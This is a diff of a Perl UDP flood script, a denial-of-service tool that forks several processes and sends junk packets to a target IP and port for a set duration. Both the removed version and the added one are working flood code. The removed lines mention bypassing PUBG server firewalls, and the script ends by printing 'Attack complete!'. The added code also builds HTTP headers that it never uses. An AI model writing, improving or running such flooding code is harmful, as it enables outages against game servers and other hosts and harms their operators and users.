@@ -1,85 +1,69 @@
 #!/usr/bin/perl
 
 use strict;
-use warnings;
 use IO::Socket::INET;
 
-# Check for command-line arguments
-if (@ARGV < 4) {
-    die "Usage: $0 <ip> <port> <time> <threads>\n";
-}
+# Usage: perl script.pl <target_ip> <target_port> <duration_seconds> <num_threads>
 
-# Parse command-line arguments
-my ($ip, $port, $time, $threads) = @ARGV;
+my $target_ip = shift || die "Usage: perl $0 <target_ip> <target_port> <duration_seconds> <num_threads>\n";
+my $target_port = shift || die "Usage: perl $0 <target_ip> <target_port> <duration_seconds> <num_threads>\n";
+my $duration_seconds = shift || die "Usage: perl $0 <target_ip> <target_port> <duration_seconds> <num_threads>\n";
+my $num_threads = shift || die "Usage: perl $0 <target_ip> <target_port> <duration_seconds> <num_threads>\n";
+
+my $payload = "A" x 1500; # Adjust payload size as needed
 
 # User agents
 my @user_agents = (
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
     "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
-    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
+    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
 );
 
-# Referrer
-my @referrers = (
-    "http://www.google.com/",
-    "http://www.bing.com/",
-    "http://www.yahoo.com/",
-    "http://www.facebook.com/",
-    "http://www.twitter.com/",
-    "http://www.reddit.com/",
-    "http://www.instagram.com/"
-);
+# Prepare headers
+my $headers = "GET / HTTP/1.1\r\n";
+$headers .= "Host: $target_ip:$target_port\r\n";
+$headers .= "User-Agent: " . $user_agents[rand @user_agents] . "\r\n";
+$headers .= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n";
+$headers .= "Accept-Language: en-US,en;q=0.5\r\n";
+$headers .= "Accept-Encoding: gzip, deflate\r\n";
+$headers .= "Connection: keep-alive\r\n";
+$headers .= "\r\n";
 
-# Payloads
-my @payloads = (
-    "A" x 1000,
-    "B" x 1000,
-    "C" x 1000,
-    "D" x 1000,
-    "E" x 1000,
-    "F" x 1000,
-    "G" x 1000,
-    "H" x 1000,
-    "I" x 1000,
-    "J" x 1000,
-    "GET / HTTP/1.1\r\nHost: $ip\r\nUser-Agent: $user_agents[int(rand(@user_agents))]\r\nReferer: $referrers[int(rand(@referrers))]\r\nConnection: keep-alive\r\n\r\n",
-    "POST / HTTP/1.1\r\nHost: $ip\r\nUser-Agent: $user_agents[int(rand(@user_agents))]\r\nReferer: $referrers[int(rand(@referrers))]\r\nContent-Length: 100\r\nConnection: keep-alive\r\n\r\n" . "A" x 100,
-    "OPTIONS / HTTP/1.1\r\nHost: $ip\r\nUser-Agent: $user_agents[int(rand(@user_agents))]\r\nReferer: $referrers[int(rand(@referrers))]\r\nConnection: keep-alive\r\n\r\n",
-    "HEAD / HTTP/1.1\r\nHost: $ip\r\nUser-Agent: $user_agents[int(rand(@user_agents))]\r\nReferer: $referrers[int(rand(@referrers))]\r\nConnection: keep-alive\r\n\r\n",
-    "PUT / HTTP/1.1\r\nHost: $ip\r\nUser-Agent: $user_agents[int(rand(@user_agents))]\r\nReferer: $referrers[int(rand(@referrers))]\r\nContent-Length: 100\r\nConnection: keep-alive\r\n\r\n" . "A" x 100,
-    "PATCH / HTTP/1.1\r\nHost: $ip\r\nUser-Agent: $user_agents[int(rand(@user_agents))]\r\nReferer: $referrers[int(rand(@referrers))]\r\nContent-Length: 100\r\nConnection: keep-alive\r\n\r\n" . "A" x 100
-);
-
-# Custom payloads for bypassing PUBG server firewalls
-my @custom_payloads = (
-    "0xFFFFFFFFFFFFFFFFFFFF", # Flood packet with invalid data
-    "0x01010101010101010101", # Flood packet with constant data
-    "0x0" x 5000,             # Flood packet with zeros
-    "0xFF" x 5000,             # Flood packet with ones
-    "0x41424344454647484950"  # Flood packet with ASCII characters
-);
-
-# Create sockets and start flooding
-for (my $i = 0; $i < $threads; $i++) {
-    my $payload = $payloads[int(rand(@payloads))];
-    my $custom_payload = $custom_payloads[int(rand(@custom_payloads))];
+# Flood function
+sub flood {
     my $socket = IO::Socket::INET->new(
-        Proto    => 'udp',
-        PeerPort => $port,
-        PeerAddr => $ip,
-    ) or die "Socket creation failed $!\n";
+        PeerAddr => $target_ip,
+        PeerPort => $target_port,
+        Proto => 'udp'
+    ) or return;
 
-    my $start_time = time();
-    while ((time() - $start_time) < $time) {
-        $socket->send($payload);
-        $socket->send($custom_payload);
+    for (1 .. $duration_seconds) {
+        print $socket $payload;
+        select(undef, undef, undef, 0.001); # Adjust delay between packets
     }
+
     close($socket);
 }
+
+# Create threads
+for (1 .. $num_threads) {
+    my $pid = fork();
+    if ($pid) {
+        # Parent process
+    } elsif ($pid == 0) {
+        # Child process
+        flood();
+        exit(0);
+    } else {
+        die "Error: Unable to fork: $!\n";
+    }
+}
+
+# Wait for child processes to finish
+for (1 .. $num_threads) {
+    wait();
+}
+
+print "Attack complete!\n";
